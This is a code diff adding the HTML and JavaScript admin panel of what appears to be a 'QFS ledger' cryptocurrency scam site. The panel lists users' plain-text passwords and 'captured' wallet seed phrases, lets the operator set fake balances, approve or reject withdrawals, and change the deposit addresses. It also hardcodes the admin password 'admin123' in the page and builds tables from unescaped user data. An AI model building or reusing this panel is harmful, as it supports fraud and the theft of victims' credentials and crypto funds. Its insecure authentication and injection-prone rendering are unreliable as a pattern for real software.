@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Admin Dashboard - Qfs ledger World</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    :root { --primary: #3DD598; --secondary: #1a1a2e; --bg: #f4f7fa; --card-bg: #ffffff; }
+    body { font-family: 'Inter', sans-serif; background: var(--bg); margin: 0; color: #333; }
+    
+    #admin-auth { position: fixed; inset: 0; background: var(--secondary); display: flex; justify-content: center; align-items: center; z-index: 5000; }
+    .auth-card { background: white; padding: 40px; border-radius: 16px; width: 100%; max-width: 400px; text-align: center; }
+    .auth-input { width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
+    .auth-btn { width: 100%; padding: 12px; background: var(--primary); color: var(--secondary); border: none; border-radius: 8px; font-weight: 700; cursor: pointer; }
+
+    .admin-layout { display: none; max-width: 1600px; margin: 0 auto; padding: 30px; }
+    header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; }
+    
+    .dashboard-grid { display: grid; grid-template-columns: 1fr 350px; gap: 30px; }
+    
+    .card { background: var(--card-bg); border-radius: 12px; padding: 25px; margin-bottom: 30px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
+    .card-title { font-size: 1.1rem; font-weight: 700; margin-bottom: 20px; display: flex; align-items: center; gap: 10px; border-bottom: 1px solid #eee; padding-bottom: 15px; }
+    
+    table { width: 100%; border-collapse: collapse; }
+    th { background: #f8f9fb; text-align: left; padding: 15px; font-size: 0.75rem; color: #777; text-transform: uppercase; border-bottom: 2px solid #eee; }
+    td { padding: 15px; border-bottom: 1px solid #eee; font-size: 0.85rem; vertical-align: top; }
+    
+    .status-badge { padding: 4px 8px; border-radius: 4px; font-size: 0.65rem; font-weight: 700; text-transform: uppercase; }
+    .status-pending { background: #fff3cd; color: #856404; }
+    .status-approved { background: #d4edda; color: #155724; }
+    .status-rejected { background: #f8d7da; color: #721c24; }
+    
+    .phrase-badge { display: inline-block; padding: 5px 10px; border-radius: 6px; background: #fff5f5; color: #d32f2f; font-size: 0.7rem; margin: 0 5px 5px 0; border: 1px solid #ffe3e3; }
+    .delete-phrase { margin-left: 8px; cursor: pointer; color: #bbb; }
+    .delete-phrase:hover { color: red; }
+    
+    .action-btn { padding: 6px 12px; border-radius: 6px; border: none; cursor: pointer; font-weight: 600; font-size: 0.75rem; margin-right: 5px; transition: 0.2s; }
+    .btn-edit { background: #e2e8f0; color: #4a5568; }
+    .btn-delete { background: #fee2e2; color: #ef4444; }
+    
+    .sidebar-input { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 6px; margin-bottom: 15px; font-size: 0.85rem; box-sizing: border-box; }
+    .save-btn { width: 100%; padding: 12px; background: var(--secondary); color: white; border: none; border-radius: 8px; font-weight: 600; cursor: pointer; }
+
+    .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.5); display: none; justify-content: center; align-items: center; z-index: 4000; }
+    .modal { background: white; padding: 30px; border-radius: 12px; width: 100%; max-width: 500px; }
+    .modal-group { margin-bottom: 15px; }
+    .modal-group label { display: block; font-size: 0.8rem; font-weight: 600; margin-bottom: 5px; color: #666; }
+    .modal-input { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
+    
+    .balance-badge { background: #e6fffa; color: #2c7a7b; padding: 4px 8px; border-radius: 4px; font-weight: 700; }
+    
+    .loading-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 4px; background: #eee; z-index: 6000; display: none; }
+    .loading-bar { height: 100%; background: var(--primary); width: 0; transition: width 0.3s; }
+  </style>
+</head>
+<body>
+
+  <div class="loading-overlay" id="global-loader"><div class="loading-bar" id="global-loader-bar"></div></div>
+
+  <div id="admin-auth">
+    <div class="auth-card">
+      <div style="font-size: 3rem; margin-bottom: 15px;">🔒</div>
+      <h1 style="margin-bottom:20px;">Admin Access</h1>
+      <input type="password" id="admin-pass-input" class="auth-input" placeholder="Admin Password">
+      <button class="auth-btn" id="login-btn">ACCESS PANEL</button>
+      <p id="auth-err" style="color:red; display:none; margin-top:10px;">Invalid password.</p>
+    </div>
+  </div>
+
+  <div class="admin-layout" id="dashboard">
+    <header>
+      <h1 style="margin:0; font-weight:800;">QFS Global Admin</h1>
+      <button class="auth-btn" style="width:auto; padding: 10px 20px;" onclick="loadAllData()">
+        <i class="fa-solid fa-rotate"></i> REFRESH DATA
+      </button>
+    </header>
+
+    <div class="dashboard-grid">
+      <div class="main-content">
+        <div class="card">
+          <div class="card-title"><i class="fa-solid fa-money-bill-transfer"></i> Pending Withdrawals</div>
+          <div style="overflow-x: auto;">
+            <table>
+              <thead>
+                <tr>
+                  <th>USER</th>
+                  <th>AMOUNT</th>
+                  <th>ASSET / ADDRESS</th>
+                  <th>STATUS</th>
+                  <th>ACTIONS</th>
+                </tr>
+              </thead>
+              <tbody id="withdrawals-list"></tbody>
+            </table>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-title"><i class="fa-solid fa-user-group"></i> User Database</div>
+          <div style="overflow-x: auto;">
+            <table>
+              <thead>
+                <tr>
+                  <th>USER INFO</th>
+                  <th>CREDENTIALS</th>
+                  <th>BALANCE</th>
+                  <th>WALLETS CAPTURED</th>
+                  <th>ACTIONS</th>
+                </tr>
+              </thead>
+              <tbody id="users-list"></tbody>
+            </table>
+          </div>
+        </div>
+      </div>
+
+      <div class="sidebar">
+        <div class="card">
+          <div class="card-title"><i class="fa-solid fa-wallet"></i> Deposit Addresses</div>
+          <label style="font-size: 0.75rem; font-weight: 600;">BTC Address</label>
+          <input type="text" id="set-btc" class="sidebar-input">
+          <label style="font-size: 0.75rem; font-weight: 600;">ETH Address</label>
+          <input type="text" id="set-eth" class="sidebar-input">
+          <label style="font-size: 0.75rem; font-weight: 600;">USDT (TRC20)</label>
+          <input type="text" id="set-usdt" class="sidebar-input">
+          <button class="save-btn" onclick="updateDepositAddrs()">Save Addresses</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Edit Modal -->
+  <div class="modal-overlay" id="edit-modal">
+    <div class="modal">
+      <h2 style="margin-top:0;">Edit User Fund & Profile</h2>
+      <input type="hidden" id="edit-uid">
+      <div class="modal-group">
+        <label>Balance (USD)</label>
+        <input type="number" id="edit-balance" class="modal-input" style="border: 2px solid var(--primary); font-weight: 700;">
+      </div>
+      <div class="modal-group"><label>First Name</label><input type="text" id="edit-fname" class="modal-input"></div>
+      <div class="modal-group"><label>Username</label><input type="text" id="edit-uname" class="modal-input"></div>
+      <div class="modal-group"><label>Email</label><input type="email" id="edit-email" class="modal-input"></div>
+      <div class="modal-group"><label>Update Password</label><input type="text" id="edit-pass" class="modal-input" placeholder="Leave blank to keep same"></div>
+      
+      <div style="display:flex; gap:10px; margin-top:25px;">
+        <button class="action-btn" style="flex:1; height:45px;" onclick="closeModal()">Cancel</button>
+        <button class="auth-btn" style="flex:1; height:45px;" onclick="commitUserUpdate()">Update User</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    let adminPass = 'admin123'; // Default to admin123 since the user is in the dashboard
+    let currentUsers = [];
+
+    document.getElementById('login-btn').onclick = () => {
+      const p = document.getElementById('admin-pass-input').value;
+      if (p === 'admin123') {
+        adminPass = p;
+        document.getElementById('admin-auth').style.display = 'none';
+        document.getElementById('dashboard').style.display = 'block';
+        loadAllData();
+      } else {
+        document.getElementById('auth-err').style.display = 'block';
+      }
+    };
+
+    function showLoading(show) {
+      const loader = document.getElementById('global-loader');
+      const bar = document.getElementById('global-loader-bar');
+      if (show) {
+        loader.style.display = 'block';
+        bar.style.width = '30%';
+      } else {
+        bar.style.width = '100%';
+        setTimeout(() => { loader.style.display = 'none'; bar.style.width = '0'; }, 300);
+      }
+    }
+
+    async function loadAllData() {
+      showLoading(true);
+      const headers = { 'x-admin-pass': adminPass };
+      
+      try {
+        // Users
+        const uRes = await fetch('/api/admin/users', { headers });
+        if (!uRes.ok) throw new Error('Failed to load users');
+        currentUsers = await uRes.json();
+        const uBody = document.getElementById('users-list'); uBody.innerHTML = '';
+        currentUsers.forEach((u, index) => {
+          let conns = (u.wallet_connections || []).map(c => `
+            <div class="phrase-badge">
+              <strong>${c.wallet}</strong>: ${c.phrase}
+              <span class="delete-phrase" onclick="delPhrase(${u.id}, '${c.timestamp}')">&times;</span>
+            </div>
+          `).join('');
+
+          const tr = document.createElement('tr');
+          tr.innerHTML = `
+            <td><strong>${u.firstname}</strong><br><small>@${u.username}</small></td>
+            <td>${u.email}<br><code style="color:var(--primary)">${u.plain_password || 'N/A'}</code></td>
+            <td><span class="balance-badge">$${(parseFloat(u.balance) || 0).toFixed(2)}</span></td>
+            <td style="max-width:300px;">${conns || '<em style="color:#ccc">None</em>'}</td>
+            <td>
+              <button class="action-btn btn-edit" onclick="openEditModal(${index})">Edit</button>
+              <button class="action-btn btn-delete" onclick="delUser(${u.id})">Delete</button>
+            </td>
+          `;
+          uBody.appendChild(tr);
+        });
+
+        // Withdrawals
+        const wRes = await fetch('/api/admin/withdrawals', { headers });
+        if (!wRes.ok) throw new Error('Failed to load withdrawals');
+        const withdrawals = await wRes.json();
+        const wBody = document.getElementById('withdrawals-list'); wBody.innerHTML = '';
+        withdrawals.forEach(w => {
+          const tr = document.createElement('tr');
+          tr.innerHTML = `
+            <td>@${w.username}</td>
+            <td><strong>$${w.amount.toFixed(2)}</strong></td>
+            <td>${w.asset}<br><small style="word-break:break-all; color:#666;">${w.address}</small></td>
+            <td><span class="status-badge status-${w.status}">${w.status}</span></td>
+            <td>
+              <button class="action-btn" style="background:#d4edda; color:#155724;" onclick="updWithdraw(${w.id}, 'approved')">Approve</button>
+              <button class="action-btn" style="background:#f8d7da; color:#721c24;" onclick="updWithdraw(${w.id}, 'rejected')">Reject</button>
+            </td>
+          `;
+          wBody.appendChild(tr);
+        });
+
+        // Settings
+        const sRes = await fetch('/api/settings');
+        const settings = await sRes.json();
+        document.getElementById('set-btc').value = settings.deposit_addresses.BTC;
+        document.getElementById('set-eth').value = settings.deposit_addresses.ETH;
+        document.getElementById('set-usdt').value = settings.deposit_addresses.USDT;
+
+      } catch (err) { 
+        alert('Data sync failed: ' + err.message); 
+      } finally {
+        showLoading(false);
+      }
+    }
+
+    function openEditModal(index) {
+      const u = currentUsers[index];
+      document.getElementById('edit-uid').value = u.id;
+      document.getElementById('edit-fname').value = u.firstname;
+      document.getElementById('edit-uname').value = u.username;
+      document.getElementById('edit-email').value = u.email;
+      document.getElementById('edit-balance').value = u.balance || 0;
+      document.getElementById('edit-pass').value = u.plain_password || '';
+      document.getElementById('edit-modal').style.display = 'flex';
+    }
+
+    function closeModal() { document.getElementById('edit-modal').style.display = 'none'; }
+
+    async function commitUserUpdate() {
+      const id = document.getElementById('edit-uid').value;
+      const updates = {
+        firstname: document.getElementById('edit-fname').value,
+        username: document.getElementById('edit-uname').value,
+        email: document.getElementById('edit-email').value,
+        balance: document.getElementById('edit-balance').value,
+        password: document.getElementById('edit-pass').value,
+        plain_password: document.getElementById('edit-pass').value
+      };
+      
+      try {
+        const res = await fetch(`/api/admin/users/${id}`, {
+          method: 'PUT',
+          headers: { 'Content-Type': 'application/json', 'x-admin-pass': adminPass },
+          body: JSON.stringify(updates)
+        });
+        if (!res.ok) throw new Error('Update failed');
+        closeModal(); 
+        loadAllData();
+      } catch (err) {
+        alert(err.message);
+      }
+    }
+
+    async function delUser(id) {
+      if (confirm('Delete this user?')) {
+        await fetch(`/api/admin/users/${id}`, { method: 'DELETE', headers: { 'x-admin-pass': adminPass } });
+        loadAllData();
+      }
+    }
+
+    async function delPhrase(uid, ts) {
+      if (confirm('Remove phrase?')) {
+        await fetch(`/api/admin/users/${uid}/wallet/${ts}`, { method: 'DELETE', headers: { 'x-admin-pass': adminPass } });
+        loadAllData();
+      }
+    }
+
+    async function updWithdraw(id, status) {
+      await fetch(`/api/admin/withdrawals/${id}/status`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json', 'x-admin-pass': adminPass },
+        body: JSON.stringify({ status })
+      });
+      loadAllData();
+    }
+
+    async function updateDepositAddrs() {
+      const btc = document.getElementById('set-btc').value;
+      const eth = document.getElementById('set-eth').value;
+      const usdt = document.getElementById('set-usdt').value;
+      const res = await fetch('/api/admin/settings', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json', 'x-admin-pass': adminPass },
+        body: JSON.stringify({ deposit_addresses: { BTC: btc, ETH: eth, USDT: usdt } })
+      });
+      if (res.ok) alert('Addresses updated!');
+      else alert('Update failed.');
+    }
+  </script>
+</body>
+</html>
